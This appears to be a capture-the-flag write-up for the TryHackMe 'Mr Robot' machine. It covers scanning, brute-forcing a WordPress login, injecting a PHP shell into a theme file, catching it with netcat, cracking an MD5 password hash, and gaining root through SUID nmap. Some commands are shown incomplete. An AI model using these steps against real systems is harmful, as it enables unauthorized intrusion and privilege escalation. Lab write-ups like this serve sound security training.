# [MrRobotCTF-THM](https://tryhackme.com/room/mrrobot)

Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

-------------

# Scanning Steps :

**Nothing Found on source code.**

## STEP 1 :

Checking Robots.txt

```html
disallow : fsocity.dic , key-1-of-3.txt
```

**FOUND KEY 1**

## STEP 2 :

Checking Ports open :

```bash
nmap -sV -sC -u $IP

22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
```
## STEP 3 :
Scanning Paths

```bash
gobuster -u $IP -w medium.txt

/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
```

**LOGIN PATH WORDPRESS**

Could be BruteForcing.


---

# Exploiting Steps :

1) **BruteForce** **Login** and **Password** using **fsocity.dic** found.

## STEP 1 :

BurpSuite username :

```html
Invalid username.
```

```html
</strong>: The password you entered for the username <strong>Elliot</strong>
```
Username : **Elliot**

## STEP 2 :

BurpSuite Password :

```html
Login Success.

ER28-0652
```

Password : **ER28-0652**

-------

2) Exploiting **Admin Wordpress Theme Php Shell Injection**

## STEP 1 :

Injecting Php Shell in 404.php and Start Listening

```bash
$IP/error404
```

Connection Received

```bash
nc -nlvp 4444

Connection received on
```

## STEP 2 :

Checking Python :

```bash
which python

/usr/bin/python
```

## STEP 3 :

Checking Permissions

```bash
$ sudo -l

sudo: no tty present and no askpass program specified
```
## STEP 4 :

Fetching Folders and permissions

```bash
$ / -user root -perm /4000
/nmap
```
**FOUND NMAP**


## STEP 5

Login to robot user

```bash
$ ls
/home
$ cd home
$ ls
robot
$ cd robot
$ ls
key-2-of-3.txt
password.raw-md5
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Cracking **Password** using **CrackStation** : **abcdefghijklmnopqrstuvwxyz**

## STEP 6 :

Checking bash and **Installing terminal**

```bash
/bin/sh: 0: can't access tty; job control turned off

$ /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ su robot
Password: abcdefghijklmnopqrstuvwxyz
robot@linux:~$ ls
ls
key-2-of-3.txt	password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt

```

**FOUND KEY 2**

## STEP 7 :

Using Nmap Permissions

```bash
bash: cd: root: No such file or directory
robot@linux:~$ nmap --interactive
nmap> !sh
!sh
# whoami
whoami
root
# cd /root && ls
cd /root && ls
firstboot_done	key-3-of-3.txt
# cat key-3-of-3.txt

```

**FOUND KEY 3**
